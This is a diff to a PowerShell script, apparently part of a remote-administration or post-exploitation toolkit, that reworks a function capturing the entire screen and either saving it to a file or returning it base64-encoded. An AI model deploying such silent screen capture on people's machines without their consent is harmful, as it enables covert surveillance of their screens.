@@ -219,31 +219,38 @@ Function Test-ADCredential
 }
 Function Get-Screenshot 
 {
-#import libraries
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
+    param($File)
 
-# Gather Screen resolution information
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$Width = $Screen.Width
-$Height = $Screen.Height
-$Left = $Screen.Left
-$Top = $Screen.Top
+    #import libraries
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
 
-# Create bitmap using the top-left and bottom-right bounds
-$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    # Gather Screen resolution information
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
 
-# Create Graphics object
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    # Create bitmap using the top-left and bottom-right bounds
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 
-# Capture screen
-$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    # Create Graphics object
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 
-# Send back as base64
-$msimage = New-Object IO.MemoryStream
-$bitmap.save($msimage, "png")
-$b64 = [Convert]::ToBase64String($msimage.toarray())
-return $b64
+    # Capture screen
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+
+    # Send back as base64
+    $msimage = New-Object IO.MemoryStream
+    
+    if ($File) {
+        $bitmap.save($file, "png")
+    } else {
+        $bitmap.save($msimage, "png")
+        $b64 = [Convert]::ToBase64String($msimage.toarray())
+    }
+    return $b64
 }
 function Download-File
 {
